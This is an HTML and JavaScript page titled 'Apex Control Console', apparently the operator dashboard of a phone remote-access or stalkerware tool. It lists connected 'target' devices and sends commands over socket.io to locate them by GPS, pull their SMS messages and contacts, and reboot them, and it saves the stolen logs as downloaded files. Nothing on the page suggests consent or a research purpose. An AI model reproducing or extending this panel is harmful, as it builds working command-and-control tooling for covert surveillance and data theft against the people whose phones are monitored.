<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apex Control Console</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght=400;700&family=Inter:wght=300;500;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <script src="/socket.io/socket.io.js"></script>

    <style>
        :root {
            --bg-gradient: linear-gradient(135deg, #0f0c1b 0%, #050510 100%);
            --panel-bg: rgba(255, 255, 255, 0.03);
            --panel-border: rgba(255, 255, 255, 0.08);
            --accent-glow: #00ffcc;
            --accent-purple: #8a2be2;
            --text-main: #f0f0f5;
            --text-muted: #8a8a9e;
        }

        body {
            margin: 0;
            padding: 0;
            background: var(--bg-gradient);
            font-family: 'Inter', sans-serif;
            color: var(--text-main);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        header {
            width: 100%;
            max-width: 1200px;
            padding: 30px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-sizing: border-box;
        }

        header h1 {
            font-family: 'Orbitron', sans-serif;
            font-size: 1.5rem;
            letter-spacing: 2px;
            text-transform: uppercase;
            background: linear-gradient(to right, #fff, var(--accent-glow));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin: 0;
        }

        .system-status {
            font-size: 0.85rem;
            color: var(--accent-glow);
            text-shadow: 0 0 10px rgba(0, 255, 204, 0.4);
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .container {
            width: 100%;
            max-width: 1200px;
            padding: 0 20px 40px 20px;
            display: grid;
            grid-template-columns: 1fr 2fr;
            gap: 30px;
            box-sizing: border-box;
        }

        @media (max-width: 768px) {
            .container { grid-template-columns: 1fr; }
        }

        .glass-panel {
            background: var(--panel-bg);
            border: 1px solid var(--panel-border);
            border-radius: 16px;
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            padding: 25px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
            transition: all 0.3s ease;
        }

        .glass-panel:hover {
            border-color: rgba(0, 255, 204, 0.2);
            box-shadow: 0 20px 40px rgba(0, 255, 204, 0.05);
        }

        h2 {
            font-family: 'Orbitron', sans-serif;
            font-size: 1.1rem;
            letter-spacing: 1px;
            margin-top: 0;
            margin-bottom: 20px;
            color: #fff;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .device-ul {
            list-style: none;
            padding: 0;
            margin: 0;
            max-height: 400px;
            overflow-y: auto;
        }

        .device-item {
            background: rgba(255, 255, 255, 0.02);
            border: 1px solid rgba(255, 255, 255, 0.05);
            padding: 15px 20px;
            border-radius: 12px;
            margin-bottom: 12px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            cursor: pointer;
            transition: all 0.2s ease;
        }

        .device-item:hover, .device-item.active {
            background: rgba(0, 255, 204, 0.05);
            border-color: var(--accent-glow);
        }

        .device-info {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .device-icon {
            font-size: 1.4rem;
            color: var(--accent-glow);
        }

        .device-name {
            font-weight: 500;
            font-size: 0.95rem;
        }

        .device-meta-row {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-top: 5px;
        }

        .meta-pill {
            font-size: 0.65rem;
            padding: 3px 8px;
            border-radius: 6px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            color: var(--text-muted);
            display: flex;
            align-items: center;
            gap: 4px;
            letter-spacing: 0.5px;
            text-transform: uppercase;
        }

        .meta-pill.crypto {
            border-color: rgba(138, 43, 226, 0.3);
            color: #b366ff;
        }

        .meta-pill.gps {
            border-color: rgba(0, 255, 204, 0.3);
            color: var(--accent-glow);
        }

        .status-badge-element {
            font-size: 0.75rem;
            font-weight: 600;
            letter-spacing: 0.5px;
            padding: 4px 10px;
            border-radius: 20px;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .status-badge-element.badge-live {
            background: rgba(0, 255, 204, 0.1);
            color: var(--accent-glow);
            border: 1px solid rgba(0, 255, 204, 0.2);
        }

        .status-badge-element.badge-live::before {
            content: '';
            width: 6px;
            height: 6px;
            background: var(--accent-glow);
            border-radius: 50%;
            display: inline-block;
            box-shadow: 0 0 8px var(--accent-glow);
        }

        .status-badge-element.badge-dead {
            background: rgba(255, 74, 74, 0.1);
            color: #ff4a4a;
            border: 1px solid rgba(255, 74, 74, 0.2);
        }

        .status-badge-element.badge-dead::before {
            content: '';
            width: 6px;
            height: 6px;
            background: #ff4a4a;
            border-radius: 50%;
            display: inline-block;
            box-shadow: 0 0 8px #ff4a4a;
        }

        .controller-interface {
            opacity: 0.2;
            pointer-events: none;
            transition: all 0.3s ease;
        }

        .controller-interface.active {
            opacity: 1;
            pointer-events: auto;
        }

        .current-target {
            font-size: 1.3rem;
            font-weight: 600;
            color: #fff;
            margin-bottom: 30px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            padding-bottom: 15px;
        }

        .controls-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
            gap: 15px;
            margin-bottom: 30px;
        }

        .luxury-btn {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            color: var(--text-main);
            padding: 16px;
            font-size: 0.9rem;
            font-weight: 500;
            cursor: pointer;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 10px;
            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .luxury-btn i {
            font-size: 1.25rem;
            color: var(--text-muted);
            transition: color 0.2s ease;
        }

        .luxury-btn:hover {
            background: rgba(255, 255, 255, 0.07);
            border-color: rgba(255, 255, 255, 0.2);
            transform: translateY(-2px);
        }

        .luxury-btn.btn-action:hover {
            border-color: var(--accent-glow);
            box-shadow: 0 0 15px rgba(0, 255, 204, 0.15);
        }
        .luxury-btn.btn-action:hover i { color: var(--accent-glow); }

        .luxury-btn.btn-danger:hover {
            border-color: #ff4a4a;
            box-shadow: 0 0 15px rgba(255, 74, 74, 0.15);
        }
        .luxury-btn.btn-danger:hover i { color: #ff4a4a; }

        .luxury-btn:active { transform: translateY(1px); }

        .slider-group { margin-top: 25px; }
        .slider-group label {
            display: block;
            font-size: 0.85rem;
            color: var(--text-muted);
            margin-bottom: 8px;
        }
        .luxury-slider {
            -webkit-appearance: none;
            width: 100%;
            height: 6px;
            background: rgba(255,255,255,0.1);
            border-radius: 10px;
            outline: none;
        }
        .luxury-slider::-webkit-slider-thumb {
            -webkit-appearance: none;
            appearance: none;
            width: 16px;
            height: 16px;
            border-radius: 50%;
            background: var(--accent-glow);
            box-shadow: 0 0 10px var(--accent-glow);
            cursor: pointer;
        }

        .empty-state {
            text-align: center;
            padding: 40px 0;
            color: var(--text-muted);
            font-size: 0.9rem;
        }
    </style>
</head>
<body>

    <header>
        <h1>Apex // Controller</h1>
        <div class="system-status">
            <i class="fa-solid fa-shield-halved"></i> Control Node Connected
        </div>
    </header>

    <div class="container">
        <div class="glass-panel">
            <h2><i class="fa-solid fa-link"></i> Live Feeds</h2>
            <ul id="device-list" class="device-ul">
                <div id="no-devices" class="empty-state">
                    <i class="fa-solid fa-satellite-dish" style="font-size: 2rem; margin-bottom:10px; display:block;"></i>
                    Waiting for device connections...
                </div>
            </ul>
        </div>

        <div id="controller-panel" class="glass-panel controller-interface">
            <h2><i class="fa-solid fa-gamepad"></i> Command Module</h2>
            <div id="active-device-title" class="current-target">No Selected Target</div>

            <div class="controls-grid">
                <button class="luxury-btn btn-action" onclick="sendCommand('Ping')">
                    <i class="fa-solid fa-wave-square"></i>
                    <span>Ping Device</span>
                </button>
                <button class="luxury-btn btn-action" onclick="sendCommand('Locate')">
                    <i class="fa-solid fa-location-crosshairs"></i>
                    <span>Locate GPS</span>
                </button>
                <button class="luxury-btn btn-action" onclick="sendCommand('sync_sms')">
                    <i class="fa-solid fa-envelope"></i>
                    <span>Sync SMS</span>
                </button>
                <button class="luxury-btn btn-action" onclick="sendCommand('sync_contacts')">
                    <i class="fa-solid fa-address-book"></i>
                    <span>Sync Contacts</span>
                </button>
                <button class="luxury-btn btn-danger" onclick="sendCommand('Reboot')">
                    <i class="fa-solid fa-power-off"></i>
                    <span>Reboot Target</span>
                </button>
                <button class="luxury-btn btn-danger" onclick="removeDeviceFromConsole()">
                    <i class="fa-solid fa-trash-can"></i>
                    <span>Remove Device</span>
                </button>
            </div>

            <div class="slider-group">
                <label><i class="fa-solid fa-gauge-high"></i> Resource Throttle Allocation</label>
                <input type="range" min="1" max="100" value="75" class="luxury-slider">
            </div>
        </div>
    </div>

<script>
    // FIX: Explicitly connect using the current origin to avoid connection errors
    const socket = io(window.location.origin);
    
    const deviceList = document.getElementById('device-list');
    const emptyState = document.getElementById('no-devices');
    const controllerPanel = document.getElementById('controller-panel');
    const activeDeviceTitle = document.getElementById('active-device-title');
    
    let selectedDeviceName = null;

    // FIX: Listen for initial state when the page first loads
    socket.on('initial_state', (devices) => {
        Object.values(devices).forEach(device => {
            renderDevice(device);
        });
    });

    // Handles live status updates
    socket.on('device_status', (data) => {
        renderDevice(data);
    });

    // Helper to keep UI consistent
    function renderDevice(data) {
        if (!data || !data.deviceName) return;
        
        if (emptyState) emptyState.style.display = 'none';

        const elementId = `dev-${data.deviceName.replace(/\s+/g, '-')}`;
        let existingItem = document.getElementById(elementId);
        
        const isOnline = data.status.toLowerCase() === 'connected';
        const badgeClass = isOnline ? 'badge-live' : 'badge-dead';
        const statusLabelText = isOnline ? 'Online' : 'Offline';

        if (existingItem) {
            const statusBadge = existingItem.querySelector('.status-badge-element');
            statusBadge.className = `status-badge-element ${badgeClass}`;
            statusBadge.innerText = statusLabelText;
            return;
        }

        const li = document.createElement('li');
        li.className = 'device-item';
        li.id = elementId;
        li.innerHTML = `
            <div class="device-info">
                <i class="fa-solid fa-mobile-screen-button device-icon"></i>
                <div>
                    <div class="device-name">${data.deviceName}</div>
                    <div class="device-meta-row">
                        <span class="meta-pill crypto"><i class="fa-solid fa-shield-halved"></i> AES-256</span>
                                   </div>
                </div>
            </div>
            <span class="status-badge-element ${badgeClass}">${statusLabelText}</span>
        `;

        li.addEventListener('click', () => {
            document.querySelectorAll('.device-item').forEach(el => el.classList.remove('active'));
            li.classList.add('active');
            selectedDeviceName = data.deviceName;
            controllerPanel.classList.add('active');
            activeDeviceTitle.innerHTML = `<i class="fa-solid fa-microchip" style="color:var(--accent-glow)"></i> ${data.deviceName}`;
        });

        deviceList.appendChild(li);
    }

    // Handle device removal
    socket.on('device_removed', (deviceName) => {
        const el = document.getElementById(`dev-${deviceName.replace(/\s+/g, '-')}`);
        if (el) el.remove();
        if (selectedDeviceName === deviceName) {
            selectedDeviceName = null;
            controllerPanel.classList.remove('active');
        }
    });

    // Data Listeners matching server emit events
    socket.on('sms_data_received', (data) => {
        if(selectedDeviceName === data.deviceName) triggerInstantDownload(data.logs, 'sms');
    });

    socket.on('contacts_data_received', (data) => {
        if(selectedDeviceName === data.deviceName) triggerInstantDownload(data.logs, 'contacts');
    });

    function triggerInstantDownload(textData, type) {
        const fileBlob = new Blob([textData], { type: 'text/plain;charset=utf-8' });
        const url = URL.createObjectURL(fileBlob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `${selectedDeviceName.replace(/\s+/g, '_')}_${type}_data.txt`;
        document.body.appendChild(a);
        a.click(); 
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    }

    function removeDeviceFromConsole() {
        if (!selectedDeviceName) return;
        socket.emit('purge_device_record', { deviceName: selectedDeviceName });
    }

    function sendCommand(action) {
        if (!selectedDeviceName) return;
        socket.emit('controller_command', { targetDevice: selectedDeviceName, command: action });
    }
</script>

</body>
</html>
